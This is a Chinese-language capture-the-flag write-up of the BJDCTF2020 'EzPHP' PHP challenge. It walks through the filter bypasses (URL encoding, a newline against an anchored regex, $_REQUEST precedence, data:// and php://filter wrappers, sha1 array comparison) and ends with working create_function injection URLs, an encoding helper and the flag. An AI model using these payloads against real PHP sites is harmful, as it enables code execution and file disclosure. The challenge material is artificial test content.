# [BJDCTF2020]EzPHP（学习）
![](<./img/Pasted image 20230128091647.png>)

![](<./img/Pasted image 20230128091626.png>)

![](<./img/Pasted image 20230128091725.png>)

![](<./img/Pasted image 20230128091954.png>)

```
/1nD3x.php
```

```php
 <?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?> 
```

这题真的是体现了不少`php`的特性qaq

# 绕过`$_SERVER['QUERY_STRING']`的过滤

```php
if($_SERVER) { 
    if (preg_match('...', $_SERVER['QUERY_STRING']))  
        die('You seem to want to do something bad?'); 
}
```

由于`$_SERVER['QUERY_STRING']`不对查询字符串进行`url`解码，而`$_GET`会进行`url`解码，因此可以通过`url`编码绕过过滤

# 绕过`aqua_is_cute`

有圣人曰

![](<./img/Pasted image 20230128100732.png>)

（大雾）

又是一个看似矛盾的判断

```php
if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') {}
```

`/^...$/`这种形式也能完全匹配字符串最后带换行符的情况，也就是可以通过加上`%0a`绕过

# 不准`hate English`

```php
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 
```

`php`在同时接收到`url`的查询字符串以及`POST`传递的参数，且参数名相同时，优先采用`POST`的参数值作为`$_REQUEST`中的参数值

因此对于传递的所有`url`查询参数，只需`POST`一组参数名相同但值不包含字母的参数即可绕过

# `debu_debu_aqua`

```php
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
```

常规的`data`伪协议绕过

# 绕过`sha1`

```php
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}
```

通过数组使`sha1`函数返回`false`

# `create_function`注入

`php`的`create_function`貌似是通过字符串拼接后调用`eval`来实现的（过于谔谔），于是可以通过`}`来使后面的代码变成顶级语句让`eval`来执行

```
/1nD3x.php?file=data://text/plain,debu_debu_aqua&debu=aqua_is_cute%0a&shana[]=1&passwd[]=2&flag[code]=create_function&flag[arg]=}var_dump(get_defined_vars());//
```

进行`url`编码

```
/1nD3x.php?%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0A&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&%66%6C%61%67[%61%72%67]=%7D%76%61%72%5F%64%75%6D%70%28%67%65%74%5F%64%65%66%69%6E%65%64%5F%76%61%72%73%28%29%29%3B%2F%2F
```

同时`POST`这些东西

```
file=1&debu=1&shana=1&passwd=1&flag=1
```

---

```html
<img src="meaqua.png" width="650" height="650" alt="MeAqua天下第一!" />
```

![](<./img/Pasted image 20230128123734.png>)

~~美少女贴贴！~~

![](<./img/Pasted image 20230128124336.png>)

使用`php://filter`读取经过`base64`编码的`rea1fl4g.php`的内容并使用`require`包含到网页中

通过取反绕过过滤

```php
<?php
$payload = $argv[1];
print(urlencode(~$payload));
```

```php
require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F)
```

```
/1nD3x.php?%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0A&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&%66%6C%61%67[%61%72%67]=%7D%72%65%71%75%69%72%65(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))%3B%2F%2F
```

![](<./img/Pasted image 20230128133626.png>)

```php
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Real_Flag In Here!!!</title>
</head>
</html>
<?php
	echo "咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！";
	$f4ke_flag = "BJD{1am_a_fake_f41111g23333}";
	$rea1_f1114g = "flag{0689e68e-6604-4ff8-a924-af158fb5072e}";
	unset($rea1_f1114g);

```

#Web #PHP #特性 #绕过 #代码审计 #变量 #特殊 #create_function注入 